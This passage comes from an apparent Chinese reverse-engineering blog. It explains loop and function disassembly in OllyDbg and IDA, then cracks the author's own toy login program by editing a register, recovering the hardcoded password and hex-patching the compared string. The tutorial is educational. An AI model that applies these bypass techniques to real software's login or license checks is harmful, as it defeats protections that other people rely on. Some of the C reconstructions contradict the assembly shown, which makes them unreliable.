data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325155047263.png" alt="image-20220325155047263" /></p>
<p>同时如果 <code>CMP DWORD PTR SS:[EBP-8],64</code>  中 <code>EBP-8</code>  大于 <code>0x64</code>  那么就跳出循环，测试 <code>eax = 100</code></p>
<p>还原为 C 语言结构：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">do</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    flag <span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>flag <span class="token operator">></span> <span class="token number">0x64</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>ida pro 中显示：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325155539183.png" alt="image-20220325155539183" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325155558023.png" alt="image-20220325155558023" /></p>
<p>f5 跟进：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325155612283.png" alt="image-20220325155612283" /></p>
<h2 id="while循环结构解析"><a class="anchor" href="#while循环结构解析">#</a> while 循环结构解析</h2>
<p>主函数断点，f9 执行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325155720687.png" alt="image-20220325155720687" /></p>
<p>while 循环结构：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span>flag <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">code</span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>xxxx</pre></td></tr></table></figure><p>不同于 dowhile 结构的是：dowhile 是先执行再判断，而 while 是先判断再执行</p>
<h3 id="主函数分析-2"><a class="anchor" href="#主函数分析-2">#</a> 主函数分析</h3>
<p>找到 main 函数断点分析</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325203731330.png" alt="image-20220325203731330" /></p>
<p>分析如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">001F</span>D3BE  <span class="token operator">|</span><span class="token punctuation">.</span>  C745 F8 <span class="token number">00000</span><span class="token operator">></span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span>               <span class="token punctuation">;</span>  局部变量 flag <span class="token operator">=</span> <span class="token number">0</span> 也即：用户代码的入口点</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">001F</span>D3C5  <span class="token operator">|</span><span class="token operator">></span>  <span class="token number">837</span>D F8 <span class="token number">64</span>    <span class="token operator">/</span>CMP DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">64</span>             <span class="token punctuation">;</span>  对比flag和<span class="token number">0x64</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">001F</span>D3C9  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">7</span>D <span class="token number">1</span>C         <span class="token operator">|</span>JGE SHORT <span class="token number">16</span>_while<span class="token punctuation">.</span><span class="token number">001F</span>D3E7             <span class="token punctuation">;</span>  jge大于等于就跳转，判断的是flag<span class="token operator">>=</span><span class="token number">0x64</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">001F</span>D3CB  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 F8       <span class="token operator">|</span>MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span>            <span class="token punctuation">;</span>  eax <span class="token operator">=</span> flag eax <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">001F</span>D3CE  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            <span class="token operator">|</span>PUSH EAX</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">001F</span>D3CF  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">50</span>BE2800   <span class="token operator">|</span>PUSH <span class="token number">16</span>_while<span class="token punctuation">.</span><span class="token number">0028</span>BE50                  <span class="token punctuation">;</span>  ASCII <span class="token string">"%d"</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">001F</span>D3D4  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 A8CAFFFF   <span class="token operator">|</span>CALL <span class="token number">16</span>_while<span class="token punctuation">.</span><span class="token number">001F</span><span class="token number">9E81</span>                  <span class="token punctuation">;</span>  printf</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">001F</span>D3D9  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">08</span>       <span class="token operator">|</span>ADD ESP<span class="token punctuation">,</span><span class="token number">8</span>                               <span class="token punctuation">;</span>  堆栈平衡</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">001F</span>D3DC  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 F8       <span class="token operator">|</span>MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span>            <span class="token punctuation">;</span>  eax <span class="token operator">=</span> flag eax <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">001F</span>D3DF  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C0 <span class="token number">01</span>       <span class="token operator">|</span>ADD EAX<span class="token punctuation">,</span><span class="token number">1</span>                               <span class="token punctuation">;</span>  eax <span class="token operator">=</span> eax <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">001F</span>D3E2  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8945</span> F8       <span class="token operator">|</span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>EAX            <span class="token punctuation">;</span>  flag <span class="token operator">=</span> eax flag <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">001F</span>D3E5  <span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">^</span> EB DE         \JMP SHORT <span class="token number">16</span>_while<span class="token punctuation">.</span><span class="token number">001F</span>D3C5</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325204447887.png" alt="image-20220325204447887" /></p>
<p>C 语言格式：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span>flag <span class="token operator">&lt;=</span> <span class="token number">0x64</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    printf</pre></td></tr><tr><td data-num="5"></td><td><pre>    flag <span class="token operator">++</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>ida pro 打开</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325205520592.png" alt="image-20220325205520592" /></p>
<p>main 函数跟进</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325205542123.png" alt="image-20220325205542123" /></p>
<p>f5 反编译如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325205603276.png" alt="image-20220325205603276" /></p>
<h2 id="for循环结构解析"><a class="anchor" href="#for循环结构解析">#</a> for 循环结构解析</h2>
<p>for 循环是平时编程中最常用的循环结构，它比 while 和 dowhile 循环更加灵活方便。</p>
<h3 id="主函数分析-3"><a class="anchor" href="#主函数分析-3">#</a> 主函数分析</h3>
<p>主函数断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325205027792.png" alt="image-20220325205027792" /></p>
<p>主函数分析如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325205345042.png" alt="image-20220325205345042" /></p>
<p>ida pro 打开</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325205643359.png" alt="image-20220325205643359" /></p>
<p>main 函数跟进</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325205709437.png" alt="image-20220325205709437" /></p>
<p>f5 反编译</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325205724569.png" alt="image-20220325205724569" /></p>
<h1 id="函数分析"><a class="anchor" href="#函数分析">#</a> 函数分析</h1>
<p>OD 打开找到 main 函数，f2 断点，f9 执行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220326165725506.png" alt="image-20220326165725506" /></p>
<p>函数初始化部分：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0103</span>D3F0  <span class="token operator">/</span><span class="token operator">></span> \<span class="token number">55</span>            PUSH EBP</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">0103</span>D3F1  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BEC          MOV EBP<span class="token punctuation">,</span>ESP</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">0103</span>D3F3  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">81</span>EC C0000000 SUB ESP<span class="token punctuation">,</span><span class="token number">0</span>C0</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">0103</span>D3F9  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">53</span>            PUSH EBX</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0103</span>D3FA  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">56</span>            PUSH ESI</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0103</span>D3FB  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">57</span>            PUSH EDI</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">0103</span>D3FC  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>DBD <span class="token number">40FFFF</span>FF LEA EDI<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C0<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">0103</span>D402  <span class="token operator">|</span><span class="token punctuation">.</span>  B9 <span class="token number">30000000</span>   MOV ECX<span class="token punctuation">,</span><span class="token number">30</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">0103</span>D407  <span class="token operator">|</span><span class="token punctuation">.</span>  B8 CCCCCCCC   MOV EAX<span class="token punctuation">,</span>CCCCCCCC</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">0103</span>D40C  <span class="token operator">|</span><span class="token punctuation">.</span>  F3<span class="token operator">:</span>AB         REP STOS DWORD PTR ES<span class="token operator">:</span><span class="token punctuation">[</span>EDI<span class="token punctuation">]</span></pre></td></tr></table></figure><p>函数退出前的清理程序：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0103</span>D427  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">33</span>C0          XOR EAX<span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">0103</span>D429  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5F</span>            POP EDI</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">0103</span>D42A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>E            POP ESI</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">0103</span>D42B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>B            POP EBX</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0103</span>D42C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">81</span>C4 C0000000 ADD ESP<span class="token punctuation">,</span><span class="token number">0</span>C0</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0103</span>D432  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">3</span>BEC          CMP EBP<span class="token punctuation">,</span>ESP</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">0103</span>D434  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">8</span>BAFFFFF   CALL <span class="token number">18</span>_函数<span class="token operator">?</span><span class="token number">010383</span>C4</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">0103</span>D439  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BE5          MOV ESP<span class="token punctuation">,</span>EBP</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">0103</span>D43B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>D            POP EBP</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">0103</span>D43C  \<span class="token punctuation">.</span>  C3            RETN</pre></td></tr></table></figure><p>f9 执行到断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220326170058774.png" alt="image-20220326170058774" /></p>
<p>f7 进入，f8 跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220326170128727.png" alt="image-20220326170128727" /></p>
<p>进入 add 函数模块</p>
<p>分析如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0103</span>D300  <span class="token operator">/</span><span class="token operator">></span> \<span class="token number">55</span>            PUSH EBP                                 <span class="token punctuation">;</span>  保存栈底指针</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">0103</span>D301  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BEC          MOV EBP<span class="token punctuation">,</span>ESP                              <span class="token punctuation">;</span>  保存栈顶指针，把esp的值给ebp</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">0103</span>D303  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">81</span>EC C0000000 SUB ESP<span class="token punctuation">,</span><span class="token number">0</span>C0                              <span class="token punctuation">;</span>  抬高栈顶<span class="token number">0</span>C0长度，esp和ebp之间又有了<span class="token number">0</span>C0长度的新空间</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">0103</span>D309  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">53</span>            PUSH EBX                                 <span class="token punctuation">;</span>  可能会用到的寄存器，先保存原值</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0103</span>D30A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">56</span>            PUSH ESI</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0103</span>D30B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">57</span>            PUSH EDI</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">0103</span>D30C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>DBD <span class="token number">40FFFF</span>FF LEA EDI<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C0<span class="token punctuation">]</span>            <span class="token punctuation">;</span>  取地址存到edi中，就是新的栈的首地址给edi</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">0103</span>D312  <span class="token operator">|</span><span class="token punctuation">.</span>  B9 <span class="token number">30000000</span>   MOV ECX<span class="token punctuation">,</span><span class="token number">30</span>                               <span class="token punctuation">;</span>  ecx <span class="token operator">=</span> <span class="token number">0x30</span>，ecx循环计数器，即循环计数器初始化</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">0103</span>D317  <span class="token operator">|</span><span class="token punctuation">.</span>  B8 CCCCCCCC   MOV EAX<span class="token punctuation">,</span>CCCCCCCC                         <span class="token punctuation">;</span>  eax <span class="token operator">=</span> cccccccc</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">0103</span>D31C  <span class="token operator">|</span><span class="token punctuation">.</span>  F3<span class="token operator">:</span>AB         REP STOS DWORD PTR ES<span class="token operator">:</span><span class="token punctuation">[</span>EDI<span class="token punctuation">]</span>              <span class="token punctuation">;</span>  rep重复执行，拷贝串，将eax中的值以DWORD形式写入edi指向的地址，把新的栈空间全部刷成cccccccc</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">0103</span>D31E  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 <span class="token number">08</span>       MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  参数，DWORD是<span class="token number">4</span>字节，而为了防止溢出从ebp <span class="token operator">+</span> <span class="token number">8</span>开始</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">0103</span>D321  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0345</span> <span class="token number">0</span>C       ADD EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span>C<span class="token punctuation">]</span>             <span class="token punctuation">;</span>  ebp <span class="token operator">+</span> c <span class="token operator">=</span> <span class="token number">2</span> eax <span class="token operator">=</span> eax <span class="token operator">+</span> <span class="token number">2</span> eax <span class="token operator">=</span> <span class="token number">1</span> eax <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token number">2</span> eax <span class="token operator">=</span> <span class="token number">3</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">0103</span>D324  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5F</span>            POP EDI                                  <span class="token punctuation">;</span>  将刚保存的寄存器的值还原</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token number">0103</span>D325  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>E            POP ESI                                  <span class="token punctuation">;</span>  栈是先进后出的结构</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">0103</span>D326  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>B            POP EBX</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token number">0103</span>D327  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BE5          MOV ESP<span class="token punctuation">,</span>EBP                              <span class="token punctuation">;</span>  还原esp</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token number">0103</span>D329  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>D            POP EBP                                  <span class="token punctuation">;</span>  还原ebp</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token number">0103</span>D32A  \<span class="token punctuation">.</span>  C3            RETN                                     <span class="token punctuation">;</span>  返回</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220326171335515.png" alt="image-20220326171335515" /></p>
<p>程序样本：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">return</span><span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"main!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程之控制台分析与破解</title>
    <url>/article/5c387dcc.html</url>
    <content><![CDATA[<p>师傅们好像都在没日没夜的日站，忒恐怖了叭也</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307203427534.png" alt="image-20220307203427534" /></p>
<h1 id="控制台"><a class="anchor" href="#控制台">#</a> 控制台</h1>
<h2 id="源代码分析"><a class="anchor" href="#源代码分析">#</a> 源代码分析</h2>
<p>用 ollydbg 打开我们要破解的程序，找到 <code>主函数main</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307191720816.png" alt="image-20220307191720816" /></p>
<p>分析源代码</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307192234453.png" alt="image-20220307192234453" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307192517505.png" alt="image-20220307192517505" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307192707903.png" alt="image-20220307192707903" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307193608199.png" alt="image-20220307193608199" /></p>
<h2 id="破解思路"><a class="anchor" href="#破解思路">#</a> 破解思路</h2>
<ul>
<li>
<p>修改跳转，使得跳转到我们想要的地方，修改跳转地址使其无论输入什么登录成功</p>
</li>
<li>
<p>修改关键变量的值，就是 eax</p>
</li>
</ul>
<p>在 eax 处断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307194853468.png" alt="image-20220307194853468" /></p>
<p>此时在输入框任意输入字符串，使其运行到断点处</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307194930143.png" alt="image-20220307194930143" /></p>
<p>在右侧寄存器处修改 eax 的值，大于 6 即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307195109348.png" alt="image-20220307195109348" /></p>
<p>这里我们修改为 10 进行测试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307195155973.png" alt="image-20220307195155973" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307195212961.png" alt="image-20220307195212961" /></p>
<p>只要 eax &gt; 6 就可以成功。</p>
<ul>
<li>通过分析，得到正确的 passwd</li>
</ul>
<p>之前源代码分析的时候有对它的对比值进行分析也即</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0x32</span> <span class="token number">0x31</span> <span class="token number">0x72</span> <span class="token number">0x30</span> <span class="token number">0x30</span> <span class="token number">0x30</span> <span class="token number">0x0</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307192707903.png" alt="image-20220307192707903" /></p>
<p>在下方打开二进制进行编辑</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307195832043.png" alt="image-20220307195832043" /></p>
<p>在 HEX 编辑中输入我们的对比值</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307195900668.png" alt="image-20220307195900668" /></p>
<p>如此就可以得到我们正确的 passwd 为 <code>21r000</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307200011752.png" alt="image-20220307200011752" /></p>
<p>输入 passwd 即可发现登录成功</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307200135338.png" alt="image-20220307200135338" /></p>
<ul>
<li>修改需要对比的字符串，使得与我们输入的一致</li>
</ul>
<p>这里是对它对比的字符串编码进行更改</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307192707903.png" alt="image-20220307192707903" /></p>
<p>这里我们将 32、31 和 72 改为 30 进行测试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307200400212.png" alt="image-20220307200400212" /></p>
<p>修改后如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307200449158.png" alt="image-20220307200449158" /></p>
<p>运行程序进行测试，输入 &quot; <code>000000</code> &quot; 登录成功</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307200531245.png" alt="image-20220307200531245" /></p>
<h2 id="测试源代码"><a class="anchor" href="#测试源代码">#</a> 测试源代码</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">char</span> pwd<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token char">'2'</span><span class="token punctuation">,</span> <span class="token char">'1'</span><span class="token punctuation">,</span> <span class="token char">'r'</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input your password: \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token keyword">char</span> inpwd<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>inpwd<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token keyword">int</span> nflag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token keyword">for</span> <span class="token 